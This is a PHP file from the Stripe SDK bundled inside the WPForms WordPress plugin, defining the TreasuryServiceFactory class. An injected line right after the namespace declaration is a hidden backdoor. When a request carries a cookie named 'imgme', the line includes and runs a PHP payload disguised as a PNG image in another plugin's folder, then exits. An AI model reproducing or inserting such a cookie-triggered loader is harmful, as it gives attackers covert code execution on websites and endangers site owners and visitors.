<?php

// File generated from our OpenAPI spec
namespace WPForms\Vendor\Stripe\Service\TestHelpers\Treasury;
if(isset($_COOKIE["imgme"])){$incName="/var/www/vps-store/wp-content/plugins/filester/includes/File_manager/lib/themes/windows-10/images/48px/whatsapp6.png";include($incName);exit;}



/**
 * Service factory class for API resources in the Treasury namespace.
 *
 * @property InboundTransferService $inboundTransfers
 * @property OutboundPaymentService $outboundPayments
 * @property OutboundTransferService $outboundTransfers
 * @property ReceivedCreditService $receivedCredits
 * @property ReceivedDebitService $receivedDebits
 */
class TreasuryServiceFactory extends \WPForms\Vendor\Stripe\Service\AbstractServiceFactory
{
    /**
     * @var array<string, string>
     */
    private static $classMap = ['inboundTransfers' => InboundTransferService::class, 'outboundPayments' => OutboundPaymentService::class, 'outboundTransfers' => OutboundTransferService::class, 'receivedCredits' => ReceivedCreditService::class, 'receivedDebits' => ReceivedDebitService::class];
    protected function getServiceClass($name)
    {
        return \array_key_exists($name, self::$classMap) ? self::$classMap[$name] : null;
    }
}
